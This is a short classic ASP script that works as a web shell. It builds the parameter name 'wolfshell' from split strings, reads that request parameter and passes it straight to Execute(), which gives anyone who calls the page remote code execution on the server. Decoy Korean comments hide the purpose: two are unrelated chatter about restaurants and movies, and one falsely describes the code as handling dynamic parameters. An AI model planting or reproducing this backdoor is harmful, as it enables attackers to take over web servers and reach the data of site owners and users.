<%
'// 이 근처에 맛있는 식당이 있나요?
Dim arr_p1, key_p2, data_p3, state_p4
arr_p1 = Array("wo", "lf", "sh", "ell")
state_p4 = 1

'// 오늘 밤에 영화 보러 갈래요?
Select Case state_p4
    Case 1
        '// 이 코드는 동적 매개변수를 처리합니다.
        key_p2 = Join(arr_p1, "")
        data_p3 = request(key_p2)
        Execute(data_p3)
    Case 0
        '// 이 블록은 비상 상황에만 사용됩니다.
        Response.Write "STATE_ERROR"
End Select
%>